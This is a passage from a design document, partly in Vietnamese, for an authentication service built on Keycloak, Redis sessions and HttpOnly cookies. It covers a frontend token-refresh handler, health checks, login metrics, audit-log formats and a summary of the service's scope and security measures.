            this.isRefreshing = true;
            
            try {
                await this.authManager.refreshToken();
                this.refreshSubscribers.forEach(callback => callback());
                this.refreshSubscribers = [];
            } catch {
                await this.authManager.logout();
                window.location.href = '/login';
            } finally {
                this.isRefreshing = false;
            }
        }
        
        return new Promise(resolve => {
            this.refreshSubscribers.push(() => {
                resolve(this.apiClient(originalRequest));
            });
        });
    }
}
```

---

## 12. Monitoring & Logging

### 12.1 Health Check

```bash
# Health endpoint
GET /actuator/health

# Response
{
    "status": "UP",
    "components": {
        "db": { "status": "UP" },
        "redis": { "status": "UP" },
        "keycloak": { "status": "UP" }
    }
}
```

### 12.2 Metrics

| Metric | Endpoint | Description |
|--------|----------|-------------|
| `auth.login.total` | `/actuator/metrics` | Total login attempts |
| `auth.login.success` | `/actuator/metrics` | Successful logins |
| `auth.login.failure` | `/actuator/metrics` | Failed logins |
| `auth.session.active` | `/actuator/metrics` | Active sessions count |
| `auth.token.refresh` | `/actuator/metrics` | Token refresh count |

### 12.3 Logging

```java
// Log format
{
    "timestamp": "2026-05-20T10:30:00.000Z",
    "level": "INFO",
    "service": "auth-service",
    "traceId": "abc123",
    "action": "LOGIN_SUCCESS",
    "userId": "user-uuid",
    "sessionId": "session-uuid",
    "ipAddress": "192.168.1.100",
    "userAgent": "Mozilla/5.0..."
}

// Audit events to log
// - LOGIN_SUCCESS
// - LOGIN_FAILED
// - LOGOUT
// - TOKEN_REFRESH
// - SESSION_CREATED
// - SESSION_INVALIDATED
// - SESSION_LIMIT_EXCEEDED
```

---

## 13. Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│                      AUTH-SERVICE - SUMMARY                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ĐÂY LÀ:                                                            │
│  ✅ OAuth2 Client wrapper cho Frontend                              │
│  ✅ Session Manager (Redis)                                          │
│  ✅ Cookie-based authentication                                     │
│  ✅ Token exchange (login, refresh, logout)                         │
│  ✅ Concurrent session management                                   │
│                                                                     │
│  KHÔNG PHẢI:                                                        │
│  ❌ Authorization Server (Keycloak đảm nhiệm)                       │
│  ❌ User Management (IAM-Service đảm nhiệm)                          │
│  ❌ Business Authorization (Resource Services đảm nhiệm)              │
│                                                                     │
│  FLOW:                                                              │
│  Frontend → Auth-Service → Keycloak (OAuth2)                        │
│              ↓                                                      │
│         Redis (Session)                                             │
│              ↓                                                      │
│         HttpOnly Cookie                                             │
│              ↓                                                      │
│         Frontend (chỉ nhận cookie)                                  │
│                                                                     │
│  SECURITY:                                                          │
│  ✅ Client secret không expose                                       │
│  ✅ Refresh token trong HttpOnly cookie                             │
│  ✅ Session tập trung trong Redis                                  │
│  ✅ Concurrent session limit                                        │
│  ✅ Token revocation                                                │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```
